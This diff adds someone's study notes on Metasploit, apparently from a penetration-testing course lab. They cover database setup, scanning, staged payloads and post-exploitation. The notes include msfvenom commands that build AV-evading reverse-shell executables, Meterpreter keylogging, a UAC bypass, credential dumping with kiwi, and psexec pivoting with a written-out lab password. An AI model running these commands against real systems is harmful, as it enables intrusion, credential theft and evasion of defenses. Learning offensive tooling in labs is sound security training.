@@ -1,0 +1,161 @@
+------------------
+NOTES
+------------------
+
+Metasploit user interfaces and setup
+	preinstalled on Kali
+		need to start the postgres backend
+		sudo systemctl enable --now postgresql
+	Initialize the database
+		sudo msfdb init
+	Updating msf
+		sudo apt update; sudo apt install metasploit-framework
+	quiet mode
+		sudo msfconsole -q
+
+	skipping over concepts i already have deeply ingrained in my memory
+
+	Metasploit database access
+		if the db is running msf will log findings and info about hosts
+			services
+			db_nmap
+				wrapper to use nmap from metasploit and save info in the db
+			db_nmap 192.168.120.11 -A -Pn
+			hosts
+			services -p 445
+		store data in different workspaces
+			workspace
+			workspace test
+
+	Auxiliary Modules
+		modules that have a bunch of non exploit features such as:
+			protocol enum
+			port scanning
+			fuzzing
+			sniffing
+			etc
+		search type:auxiliary name:smb
+		use auxiliary/scanner/smb/smb_version
+		services -p 445 --rhosts
+		setg vs set
+			setg will persist through differnet modules (global)
+
+	Exploit Modules
+		been known
+
+	Metasploit Payloads
+		Staged vs Non-Staged
+			Non-staged just sends the whole blob of shellcode in one attempt
+			staged has two stages, usually being 1.) a small payload makes the victim connect back to the attacker and transfer a larger secondary payload with the rest of the shellcode
+			When staged is better
+				buffer space is small
+				some AV evasion
+			"/" character is used to denote whether a payload is staged or not
+				ex.
+				shell_reverse_tcp = not staged
+				shell/reverse_tcp = staged
+
+		Meterpreter Payloads
+			meterperter is a multifunction payload that can be extended at run time
+			more features than just a standard reverse connection
+				file transfer, keylogging, etc
+			msf > search meterpreter type:payload
+
+			upload /usr/share/windows-resources/binaries/nc.exe c:\\Users\\Offsec
+			download "c:\windows\system32\calc.exe" /tmp/calc.exe
+
+		Executable Payloads
+			msfvenom (as previously covered)
+			msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.2 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
+				-i = encoding interations
+			msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.2 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
+				-x = inject in a previously used .exe file
+
+		Exploit mutli handler
+			can be configured to expect different types of Payloads
+
+		Client side attacks
+			msfvenom has formats useful for client side attacks
+				hta-psh, vba, vba-psh
+
+		Advanced features and transports
+			msf > show advanced
+			EnableStageEncoding with StageEncoder to encode the second stage to hopefully bypass AV
+				set EnableStageEncoding true
+				set StageEncoder x86/shikata_ga_nai
+				exploit -j
+			AutoRunScript
+				auto run a script when a meterpreter conn is made
+				set AutoRunScript windows/gather/enum_logged_on_users
+			backgrounding and sessions
+				meterpreter > background
+				msf6 exploit(multi/handler) > sessions -l
+				msf6 exploit(multi/handler) > sessions -i 1
+				meterpreter >
+
+	Building your own msf module
+		sudo mkdir -p /root/.msf4/modules/exploits/windows/http
+		sudo cp /usr/share/metasploit-framework/modules/exploits/windows/http/disk_pulse_enterprise_get.rb /root/.msf4/modules/exploits/windows/http/syncbreeze.rb
+		edit exploit code in ruby
+
+	Post Exploitation with metasploit
+		features of meterpreter
+			screenshot
+			keyscan_start
+			keyscan_dump
+			keyscan_stop
+
+		migrating processes
+			if a user exits the process that is exploited, the shell will die
+			migrate to a new process so the shell wont explode
+			see all running processes
+				ps
+			migrate <PID>
+
+		Post-Exploitation Modules
+			use exploit/windows/local/bypassuac_injection_winsxs
+			set TARGET 1
+			set PAYLOAD windows/x64/meterpreter/reverse_tcp
+			set LHOST 192.168.118.2
+			exploit
+			load powershell
+			help powershell
+			powershell_execute "$PSVersionTable.PSVersion"
+			load kiwi
+			getsystem
+			creds_msv
+
+		Pivoting
+			route add 192.168.1.0/24 11
+			use auxiliary/scanner/portscan/tcp
+			set RHOSTS 192.168.1.110
+			set PORTS 445,3389
+			use exploit/windows/smb/psexec
+			set SMBDomain corp
+			set SMBUser jeff_admin
+			set SMBPass Qwerty09!
+			set RHOSTS 192.168.1.110
+			set payload windows/meterpreter/bind_tcp
+				payloads needs to be a bind shell, reverse shell has no route to get back to us
+			set LHOST 192.168.1.110
+			set LPORT 444
+			exploit
+
+			use multi/manage/autoroute
+			set session 4
+			exploit
+
+			use auxiliary/server/socks4a
+			set SRVHOST 127.0.0.1
+			exploit -j
+			sudo echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf
+			sudo proxychains rdesktop 192.168.1.110
+
+			meterpreter > portfwd -h
+			portfwd add -l 3389 -p 3389 -r 192.168.1.110
+			rdesktop 127.0.0.1
+
+		Metasploit automation
+			.rc files can be used to store config
+
+			sudo msfconsole -r setup.rc
